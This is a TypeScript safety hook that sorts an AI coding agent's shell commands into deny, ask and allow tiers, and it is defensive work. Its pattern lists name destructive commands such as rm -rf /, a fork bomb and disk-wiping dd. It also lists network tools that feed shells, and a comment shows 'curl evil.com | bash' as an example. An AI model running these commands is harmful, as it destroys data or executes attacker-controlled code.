/**
 * Dangerous Command Blocker - 3-tier command safety system
 * Hook: PreToolUse (Bash)
 * CC 2.1.7 Compliant: outputs JSON with continue field
 * CC 2.1.69: Added "ask" decision tier for gray-zone commands
 *
 * Tiers:
 *   DENY  — catastrophic, never legitimate (rm -rf /, fork bomb, DROP DATABASE)
 *   ASK   — dangerous but sometimes legitimate (git reset --hard, sudo, kill)
 *   ALLOW — everything else (silent pass-through)
 */

import type { HookInput, HookResult , HookContext} from '../../types.js';
import {
  outputSilentSuccess,
  outputDeny,
  outputAsk,
} from '../../lib/common.js';
import {
  blankQuotedHeredocBodies,
  containsDangerousCommand,
  normalizeSingle,
} from '../../lib/normalize-command.js';
import { NOOP_CTX } from '../../lib/context.js';

// =============================================================================
// DENY tier — catastrophic system damage, NEVER legitimate
// =============================================================================

/**
 * Substring patterns matched after compound-splitting via containsDangerousCommand().
 */
const DENY_PATTERNS: string[] = [
  // Filesystem destruction
  'rm -rf ~',
  'rm -fr ~',
  'mv /* /dev/null',
  // Device wiping
  '> /dev/sda',
  'mkfs.',
  'dd if=/dev/zero of=/dev/',
  'dd if=/dev/random of=/dev/',
  // Permission abuse
  'chmod -R 777 /',
  // Database destruction
  'drop database',
  'drop schema',
  'truncate table',
];

/**
 * Regex patterns for root-path destruction (anchored to avoid false positives).
 *
 * macOS /private/{etc,var,home} map to /etc, /var, /home via symlinks, so
 * deleting them is equally destructive. CC 2.1.113 hardened Bash(rm:*) rules
 * to treat these as dangerous; we mirror that at the hook layer for defense
 * in depth. /private/tmp is excluded — tmpdir cleanup is sometimes legit.
 */
const DENY_REGEX_PATTERNS: { pattern: RegExp; label: string }[] = [
  { pattern: /\brm\s+-r[f]\s+\/(\s|$|\*|\))/i, label: 'rm -rf /' },
  { pattern: /\brm\s+-[f]r\s+\/(\s|$|\*|\))/i, label: 'rm -fr /' },
  { pattern: /\brm\s+-[rf]{1,2}\s+\/private\/(etc|var|home)(\/|\s|$)/i, label: 'rm -rf /private/{etc,var,home}' },
];

// =============================================================================
// ASK tier — dangerous but sometimes legitimate, escalate to user
// NOTE (CC 2.1.101): permissions.deny rules now override our 'ask' decision.
// If a user has a deny rule matching these commands, CC blocks them outright
// instead of prompting. This is correct behavior — deny > ask > allow.
//
// COMPOSE BOUNDARY (CC 2.1.183): CC now natively BLOCKS destructive git
// (`reset --hard`, `checkout -- .`, `clean -fd`, `stash drop`), non-agent
// `commit --amend`, and `terraform`/`pulumi`/`cdk destroy` — but ONLY in auto
// mode, as an unattended backstop. This hook fires in EVERY permission mode at
// PreToolUse, so the two compose: native auto-mode block is the headless safety
// net; this ASK tier gives interactive users the confirmation prompt native
// auto-mode skips. We mirror CC's discard-risk set below for interactive parity
// (and keep force-push/sudo/kill, which native auto-mode blocking does not cover).
// `commit --amend` is intentionally NOT mirrored: a stateless PreToolUse hook
// can't tell "made by the agent this session" from a legitimate amend, so it is
// left to native auto-mode block to avoid false-prompting every rebase/amend.
// =============================================================================

/**
 * Substring patterns that trigger user confirmation.
 */
const ASK_PATTERNS: { pattern: string; reason: string }[] = [
  { pattern: 'git reset --hard', reason: 'Discards all uncommitted changes. Are you sure?' },
  { pattern: 'git clean -fd', reason: 'Permanently removes untracked files. Are you sure?' },
  // CC 2.1.183 interactive parity — discard-risk ops CC blocks in auto mode.
  { pattern: 'git stash drop', reason: 'Permanently deletes a stashed change set. Are you sure?' },
];

/**
 * Regex patterns that trigger user confirmation.
 */
const ASK_REGEX_PATTERNS: { pattern: RegExp; reason: string }[] = [
  {
    pattern: /git\s+push\s+.*(-f|--force)\b/i,
    reason: 'Force-push rewrites remote history. Are you sure?',
  },
  // CC 2.1.183 interactive parity — whole-tree working-copy discard.
  // CC blocks `git checkout -- .` in auto mode; ork gates every equivalent
  // full-tree discard: any whole-tree pathspec (`.`, `./`, `*`, `:/`), the
  // no-`--` form (`git checkout .`), and the modern `git restore .` default.
  // The pathspec must be a BARE token preceded by whitespace, so targeted paths
  // (`-- src/x`, `-- .gitignore`, `README.md`, `*.ts`) still allow. `[^&|;]*`
  // scopes the scan to the checkout/restore segment of a compound command.
  {
    pattern: /git\s+(checkout|restore)\b[^&|;]*\s(\.\/?|:\/|\*)(\s|$)/i,
    reason: 'Discards all unstaged changes in the working tree. Are you sure?',
  },
  // CC 2.1.183 interactive parity — IaC stack teardown (auto mode blocks these).
  // `destroy(\s|$)` not `\bdestroy\b`: the word boundary let `destroy-plan`
  // (a read-only wrapper subcommand) over-match, since `-` is a non-word char.
  {
    pattern: /\b(terraform|pulumi|cdk)\s+destroy(\s|$)/i,
    reason: 'Tears down infrastructure resources. Are you sure?',
  },
  {
    pattern: /\bsudo\s+/i,
    reason: 'Elevated privileges requested. Are you sure?',
  },
  {
    pattern: /\b(kill|pkill|killall)\s+/i,
    reason: 'Terminates running processes. Are you sure?',
  },
  {
    pattern: /\bdocker\s+system\s+prune\b/i,
    reason: 'Removes all unused Docker resources. Are you sure?',
  },
  {
    pattern: /\brm\s+-r[f]*\s+\.?\/?\/?node_modules\b/i,
    reason: 'Removes all installed dependencies. Are you sure?',
  },
];

/**
 * Shell interpreters that should never receive piped input.
 * Stays in DENY tier — executing arbitrary remote code is never safe to "ask" about.
 *
 * The `(?<!\|)\|(?!\|)` guard matches a REAL pipe only. Without it the second
 * `|` of a `||` operator matched, so `make build || bash fallback.sh` and
 * `cmd 2>&1 || python3 -c "..."` were denied as "piping to a shell" (#2955).
 * `||` is logical OR: it runs the right side when the left FAILS and pipes
 * nothing. This narrows the pattern to real pipes; every `curl ... | bash`
 * remains blocked.
 */
/**
 * Interpreters that execute stdin AS A SCRIPT. Piping anything into these is a
 * deny regardless of where the bytes came from: `cat /tmp/x | sh` runs whatever
 * is in that file, and there is no data-processing idiom that needs it.
 */
const SHELL_EXEC_RE = /^(sh|bash|zsh|dash|tclsh)\b/i;

/**
 * Interpreters routinely fed DATA alongside an inline script (`-c` / `-e`).
 * `tail app.jsonl | python3 -c "..."` is ordinary log parsing, so these are
 * denied only when the bytes originate off-machine (see hasNetworkSource).
 */
const SCRIPT_INTERPRETER_RE = /^(python[23]?|node|perl|ruby)\b/i;

/**
 * True when the command pipes into a shell interpreter.
 *
 * Scans quote state character by character instead of regex-matching a
 * quote-STRIPPED command (#2955 follow-up). Two properties matter, and a
 * single regex over normalizeSingle() output cannot satisfy both:
 *
 *   1. A `|` INSIDE quotes is literal text, not a pipe. Stripping quotes first
 *      turned inert argument text into an apparent pipe, so
 *      `grep -nE 'run_test|bash ' file` was denied despite containing no pipe
 *      at all. Regex alternations, awk programs and sed scripts hit this
 *      constantly.
 *   2. The interpreter NAME may be quoted and still execute: `curl x | 'bash'`
 *      runs bash. So quotes cannot simply be blanked either — the target word
 *      is unquoted only after a real pipe is found.
 *
 * `||` is logical OR (runs the right side when the left FAILS, pipes nothing)
 * and is skipped. Every `curl ... | bash` stays blocked.
 */
const NETWORK_SOURCE_RE =
  /\b(curl|wget|fetch|nc|ncat|netcat|ssh|scp|ftp|telnet|aria2c|http|https|httpie)\b/i;

/**
 * True when text upstream of an interpreter pipe fetches from the network.
 *
 * This is what separates remote code execution from ordinary data plumbing.
 * `curl evil.com | bash` runs bytes an attacker controls; `tail app.jsonl |
 * python3 -c "..."` runs a script the user just typed, over local data they
 * already own. Both matched the old rule, so parsing a local log file was
 * denied as if it were an RCE (#3096). The interpreter is not the hazard —
 * an untrusted SOURCE feeding it is.
 *
 * Scans the whole upstream prefix, not just the segment adjacent to the pipe,
 * so `curl x | tail -5 | bash` stays blocked even though `tail` sits between.
 */
export function hasNetworkSource(upstream: string): boolean {
  return NETWORK_SOURCE_RE.test(upstream);
}

/** Which interpreter shape a real pipe targets, or null when none. */
export type PipeToInterpreterKind = 'exec' | 'interpreter';

export function pipesToShellInterpreter(cmd: string): PipeToInterpreterKind | null {
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];

    if (ch === '\\' && inDouble) {
      i++; // escaped char inside double quotes
      continue;
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      continue;
    }
    if (ch !== '|' || inSingle || inDouble) continue;

    // Skip `||` (logical OR) in both directions.
    if (cmd[i + 1] === '|') {
      i++;
      continue;
    }
    if (i > 0 && cmd[i - 1] === '|') continue;

    // Real pipe. Unquote the target word so `| 'bash'` and `| b"a"sh` still match.
    const target = cmd.slice(i + 1).replace(/['"]/g, '').trimStart();

    // stdin-as-script: always a deny, whatever the source.
    if (SHELL_EXEC_RE.test(target)) return 'exec';

    // stdin-as-data: a deny only when the bytes came off-machine. Local data
    // into `python3 -c` is log parsing, not RCE (#3096).
    if (SCRIPT_INTERPRETER_RE.test(target) && hasNetworkSource(cmd.slice(0, i)))
      return 'interpreter';
  }

  return null;
}

// -----------------------------------------------------------------------------
// Deny messages for the pipe-to-interpreter guard.
//
// permissionDecisionReason is fed back to the model on a PreToolUse deny, and
// CC keeps NO memory of a denied command (no dedup, no backoff). So a reason
// that only says "blocked, dangerous" leaves the model to re-emit the single
// most natural idiom (`curl <url> | python3`) next turn, and it hits the same
// wall forever. The reason must REDIRECT to the allowed shape: fetch to a file
// first, then read the file locally (a network source is what makes the piped
// form an RCE; local data into an interpreter is allowed, #3096).
// -----------------------------------------------------------------------------
const PIPE_TO_SHELL_DENY =
  'Piping fetched output into a shell interpreter detected.\n\n' +
  'This runs code you have never seen, so it is blocked. Split it into steps you can inspect:\n' +
  '  1. curl -fsSL "<url>" -o /tmp/script.sh   (fetch to a file)\n' +
  '  2. less /tmp/script.sh                    (read what it does)\n' +
  '  3. bash /tmp/script.sh                    (run only after inspecting)';

const PIPE_TO_INTERPRETER_DENY =
  'Piping network output into a script interpreter detected.\n\n' +
  'Remote bytes into python3/node/perl/ruby is the remote-code-execution shape, so it is blocked.\n' +
  'Fetch and interpret as SEPARATE steps (local data into an interpreter is allowed):\n' +
  '  1. curl -fsSL "<url>" -o /tmp/data.json                            (network to file)\n' +
  '  2. python3 -c \'import json; d = json.load(open("/tmp/data.json"))\' (file to interpreter, OK)\n' +
  'For an API read, prefer a real client or MCP query tool over curl piped to an interpreter.';

// =============================================================================
// Main handler
// =============================================================================

export function dangerousCommandBlocker(input: HookInput, ctx: HookContext = NOOP_CTX): HookResult {
  const command = input.tool_input.command || '';
  if (!command) return outputSilentSuccess();

  // --- DENY tier: catastrophic patterns (compound-split matching) ---
  const dangerousCheck = containsDangerousCommand(command, DENY_PATTERNS);
  if (dangerousCheck.matches) {
    const pattern = dangerousCheck.matched!;
    ctx.log('dangerous-command-blocker', `BLOCKED: Dangerous pattern: ${pattern}`);
    ctx.logPermission('deny', `Dangerous pattern: ${pattern}`, input);
    return outputDeny(
      `Command matches dangerous pattern: ${pattern}\n\n` +
        'This command could cause severe system damage and has been blocked.',
    );
  }

  // --- DENY tier: root-path regex patterns ---
  // Collapse `//` → `/` and `/./` → `/` on paths so that `rm -rf /private//etc`
  // and `rm -rf /private/./etc` normalize to `/private/etc` before regex
  // matching. normalizeSingle handles quotes/escapes/compound ops but does
  // NOT canonicalize path-traversal artifacts. Without this, the /private
  // regex was bypassable via trivial slash-doubling.
  const normalizedForRegex = normalizeSingle(command)
    .replace(/\/+/g, '/')
    .replace(/\/\.\//g, '/');
  for (const { pattern, label } of DENY_REGEX_PATTERNS) {
    if (pattern.test(normalizedForRegex)) {
      ctx.log('dangerous-command-blocker', `BLOCKED: Dangerous pattern: ${label}`);
      ctx.logPermission('deny', `Dangerous pattern: ${label}`, input);
      return outputDeny(
        `Command matches dangerous pattern: ${label}\n\n` +
          'This command could cause severe system damage and has been blocked.',
      );
    }
  }

  const normalizedCommand = normalizeSingle(command).toLowerCase();

  // --- DENY tier: fork bomb ---
  if (normalizedCommand.includes(':(){:|:&};:')) {
    const reason = 'Fork bomb detected';
    ctx.log('dangerous-command-blocker', `BLOCKED: ${reason}`);
    ctx.logPermission('deny', reason, input);
    return outputDeny(
      `Command matches dangerous pattern: :(){:|:&};:\n\n` +
        'This command could cause severe system damage and has been blocked.',
    );
  }

  // --- DENY tier: piping to shell interpreters ---
  // Uses the RAW command: quote state is what decides whether a `|` is a pipe,
  // and normalizeSingle() has already stripped the quotes.
  // Blank QUOTED heredoc bodies first (#3098): `cat > x.sh <<'SH' ... SH` is
  // writing inert text to a file — a `| bash` inside that body is script
  // CONTENT, not an operator of this command. Bash performs no expansion in a
  // quoted heredoc, so nothing in it can execute here. UNQUOTED heredoc bodies
  // stay scanned: `$(curl x | bash)` inside one DOES execute via command
  // substitution.
  const pipeKind = pipesToShellInterpreter(blankQuotedHeredocBodies(command));
  if (pipeKind) {
    ctx.log('dangerous-command-blocker', `BLOCKED: Piping to shell interpreter (${pipeKind})`);
    ctx.logPermission('deny', 'Piping to shell interpreter detected', input);
    return outputDeny(pipeKind === 'exec' ? PIPE_TO_SHELL_DENY : PIPE_TO_INTERPRETER_DENY);
  }

  // --- ASK tier: dangerous but sometimes legitimate (substring) ---
  const askSubstringCheck = containsDangerousCommand(
    command,
    ASK_PATTERNS.map((p) => p.pattern),
  );
  if (askSubstringCheck.matches) {
    const matched = ASK_PATTERNS.find((p) => p.pattern === askSubstringCheck.matched);
    if (matched) {
      ctx.log('dangerous-command-blocker', `ASK: ${matched.reason}`);
      ctx.logPermission('ask', matched.reason, input);
      return outputAsk(matched.reason);
    }
  }

  // --- ASK tier: dangerous but sometimes legitimate (regex) ---
  for (const { pattern, reason } of ASK_REGEX_PATTERNS) {
    if (pattern.test(normalizedCommand)) {
      ctx.log('dangerous-command-blocker', `ASK: ${reason}`);
      ctx.logPermission('ask', reason, input);
      return outputAsk(reason);
    }
  }

  return outputSilentSuccess();
}
